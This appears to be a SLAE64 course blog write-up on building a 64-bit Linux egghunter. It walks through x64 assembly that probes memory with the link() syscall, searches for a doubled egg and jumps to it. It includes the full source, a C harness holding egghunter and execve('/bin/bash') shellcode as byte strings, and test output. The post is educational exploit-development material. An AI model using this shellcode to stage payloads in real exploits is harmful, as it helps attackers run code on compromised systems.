---
title: SLAE64 Assignment 3 - EggHunter
date: 2020-4-26
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

# Overview
For the third assignment of the SLAE64 course I created a 64 bit egghunter. To check if the memory is readable, the egghunter uses the `link()` system call.   
The egghunter scans the hosts process memory, byte by byte, in search for the egg. Once the egghunter finds the egg, it will check to see if there is 2 eggs or only one instance of the egg. If there is only 1 instance of the egg, then the egg hunter is probably reading the egg from itself. To overcome this issue, the egg hunter must find the egg twice.

# Creating the EggHunter

## The Link System Call
To find detailed information about the link system call, the first thing we do is consult the man(uel) pages.  

```bash
user$ man link.2
int link(const char *oldpath, const char *newpath);
rax=0x56     rdi=Address         rsi=0x0
```  

For the purpose of the egghunter, we do not care about what the function/system call really does. All we care about is that it will return an error if the memory address we feed it is not readable.   
You may be thinking: 
+ "Why do I need to know if the address is readable or not?"
+ "Why not just read/scan each byte of the memory space, regardless if it's readable or not?"  

Well, if you try that, you will quickly discover that your egghunter crash the host program. To avoid crashing, we will discover readability by passing the memory address to link as the first argument `*oldpath`. For the second argument `*newpath` we will set that to 0.   

#### Assembly for our Link Function  

```nasm
 lea rdi, [rdx+0x8]  ; ARG1=*oldpath
 xor rsi, rsi        ; ARG2=*newpath
 xor rax, rax        ; reset rax for syscall
 add al, 0x56        ; System Call for link()
 syscall             ; Executes link()
```    

### Link() - Cannot Read Memory  
If the memory at the address in the `RDI` register is not readable, an error code will be returned in the rax register. After the system call, we will check for this error. If the error exists, then we will check the next memory page.  

#### Next Memory Page Assembly  

```nasm  
nextPage:            ; Increment RDX to the next memory page
 or dx, 0xfff        ; 0xfff = 4096. Size of page
nextAddress:         ; Increment RDX to the next memory address
 inc rdx
 lea rdi, [rdx+0x8]  ; ARG1=*oldpath
 xor rsi, rsi        ; ARG2=*newpath
 xor rax, rax        ; reset rax for syscall
 add al, 0x56        ; System Call for link()
 syscall             ; Executes link()
 cmp al, 0xf2        ; Can memory address be read?
 jz nextPage         ; If no, check the next memory page
```  

+ The error for not being able to read the memory is `0xfffffffffffffff2`. Checking the last byte works just as good as checking all 8 bytes, and it also makes our shellcode length smaller.

### Check for the Egg
If the memory is readable, then we will check to see if our egg exists at the memory location.

```nasm  
 jz nextPage         ; If no, check the next memory page
 xor rbx, rbx
 add ebx, 0x50905090 ; Configure Egg in RBX
 cmp [rdx], ebx      ; Egg?
 jnz nextAddress     ; No Egg? Go to next memory page
```   

If the egg does not exist, then we will increase the memory address by 1 byte and check again. We will continue scanning the memory space byte by byte, until either we find the egg or we cannot read the memory. If the memory is unreadable, we will check the next memory page by incrementing the address by 4096ish bytes. 

### Check for a Double Egg
If the egg exists, we will see if there are two instances of our egg, or only one. If only one egg exists, then that is not the egg(s) we are looking for. In such a case of only 1 egg, we will keep our scan continuing. Although if our egg exists twice, we will jump to our eggs and execute our payload.

```nasm
 cmp [rdx], ebx      ; Egg?
 jnz nextAddress     ; No Egg? Go to next memory page
 cmp [rdx+0x4], ebx  ; second Egg?
 jnz nextAddress     ; No Egg? Check next memory address
 jmp rdx             ; EGG FOUND! Jump to Egg!
```

# Testing the EggHunter

#### EggHunter Assembly

```nasm  
; Filename: eggHunter.nasm
; Author:   boku
global _start
_start:
 xor rcx, rcx        ; RCX = 0x0
 mul rcx             ; RAX & RDX = 0x0
; Location Shellcode: 0x555555558060
;                     0x555510100000
; gdb-peda$ vmmap
; Start              End                Perm      Name
; 0x0000555555554000 0x0000555555557000 r-xp      /home/beta/git/slae64/3-egghunter/Hunter
; 0x0000555555557000 0x0000555555558000 r-xp      /home/beta/git/slae64/3-egghunter/Hunter
; 0x0000555555558000 0x0000555555559000 rwxp      /home/beta/git/slae64/3-egghunter/Hunter
; 0x0000555555559000 0x000055555557a000 rwxp      [heap]

 add rdx, 0x55551010 ; Start at a higher address (hopefully reduce time)
 shl rdx, 0x10       ; 0x55551010 => 0x555510100000
nextPage:            ; Increment RDX to the next memory page
 or dx, 0xfff        ; 0xfff = 4096. Size of page
nextAddress:         ; Increment RDX to the next memory address
; int link(const char *oldpath, const char *newpath);
 inc rdx
 lea rdi, [rdx+0x8]  ; ARG1=*oldpath
 xor rsi, rsi        ; ARG2=*newpath
 xor rax, rax        ; reset rax for syscall
 add al, 0x56        ; System Call for link()
 syscall             ; Executes link()
; Check if memory page is accessible
 cmp al, 0xf2        ; Can memory address be read?
; strace ./eggHunter
; link(0x1008, NULL)                      = -1 EFAULT (Bad address)
 jz nextPage         ; If no, check the next memory page
 xor rbx, rbx
 add ebx, 0x50905090 ; Configure Egg in RBX
 cmp [rdx], ebx      ; Egg?
 jnz nextAddress     ; No Egg? Go to next memory page
 cmp [rdx+0x4], ebx  ; second Egg?
 jnz nextAddress     ; No Egg? Check next memory address
 jmp rdx             ; EGG FOUND! Jump to Egg!
```  

## Compiling the EggHunter

To test the egghunter, we create a simple C program that will search for our egg(s). Once we find our eggs, the egghunter will jump to our payload and execute our execve shellcode.


#### EggHunter C Program
```nasm
// Shellcode Title:  Linux/x64 - EggHunter Execve Shellcode (63 Bytes)
// Shellcode Author: Bobby Cooke
// Tested On:        Kali Linux 5.3.0-kali3-amd64 x86_64
// Filename: Hunter.c
#include <stdio.h>
#include <string.h>
// This is the egg for our eggHunter
// the egg should be 4 bytes and be executable
#define egg "\x90\x50\x90\x50"

unsigned char shellcode[] = \
egg \
egg \
"\x48\x31\xf6"     // xor rsi, rsi
"\x48\xf7\xe6"     // mul rsi          ; rdx&rax= 0x0
"\x48\x31\xff"     // xor rdi, rdi
"\x57"             // push rdi
"\x48\x83\xc2\x68" // add rdx, 0x68
"\x52"             // push rdx
"\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73" // movabs rdx, 0x7361622f6e69622f ; "/bin/bas"
"\x52"             // push rdx
"\x48\x31\xd2"     // xor rdx, rdx
"\x48\x89\xe7"     // mov rdi, rsp ; rdi = Pointer -> "/bin/bash"0x00
"\xb0\x3b"         // mov al, 0x3b ; execve syscall number
"\x0f\x05";        // syscall  ; call execve("/bin/bash", NULL, NULL)

// Replace the hardcoded egg with a variable.
// This allows us to easily change the egg for our eggHunter.
unsigned char egghunter[] = \
"\x48\x31\xc9"                 // xor rcx, rcx
"\x48\xf7\xe1"                 // mul rcx
"\x48\x81\xc2\x10\x10\x55\x55" // add rdx, 0x55551010 ; Start >0 (hopefully reduce time)
"\x48\xc1\xe2\x10"             // shl rdx, 0x10       ; 0x55551010 => 0x555510100000
// nextPage:
"\x66\x81\xca\xff\x0f"         // or dx, 0xfff        ; 0xfff = 4096. Size of page
// nextAddress:
// ; int link(const char *oldpath, const char *newpath);
"\x48\xff\xc2"     // inc rdx
"\x48\x8d\x7a\x08" // lea rdi, [rdx+0x8]  ; ARG1=*oldpath
"\x48\x31\xf6"     // xor rsi, rsi        ; ARG2=*newpath
"\x48\x31\xc0"     // xor rax, rax        ; reset rax for syscall
"\x04\x56"         // add al, 0x56        ; System Call for link()
"\x0f\x05"         // syscall             ; Executes link()
"\x3c\xf2"         // cmp al, 0xf2        ; Can memory address be read?
"\x74\xe6"         // jz nextPage         ; If no, check the next memory page
"\x48\x31\xdb"     // xor rbx, rbx
"\x81\xc3\x90\x50\x90\x50"     // add ebx, 0x50905090 ; Configure Egg in RBX
"\x39\x1a"         // cmp [rdx], ebx      ; Egg?
"\x75\xde"         // jnz nextAddress     ; No Egg? Go to next memory page
"\x39\x5a\x04"     // cmp [rdx+0x4], ebx  ; second Egg?
"\x75\xd9"         // jnz nextAddress     ; No Egg? Check next memory address
"\xff\xe2";        // jmp rdx             ; EGG FOUND! Jump to Egg!

int main()
{
    printf("Memory Location of Shellcode: %p\n", shellcode);
    printf("Memory Location of EggHunter: %p\n", egghunter);
    printf("Size of Egghunter:          %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

## Testing the EggHunter

```bash
root# gcc -m64 -z execstack -fno-stack-protector Hunter.c -o Hunter
root# echo $$ | xargs ps
  PID TTY      STAT   TIME COMMAND
13916 pts/4    Ss     0:00 /bin/bash
root# ./Hunter
Memory Location of Shellcode: 0x555555558060
Memory Location of EggHunter: 0x5555555580a0
Size of Egghunter:          63
root# echo $$ | xargs ps
  PID TTY      STAT   TIME COMMAND
14495 pts/4    S      0:00 [bash]
```

+ Awesome! Our EggHunter works!
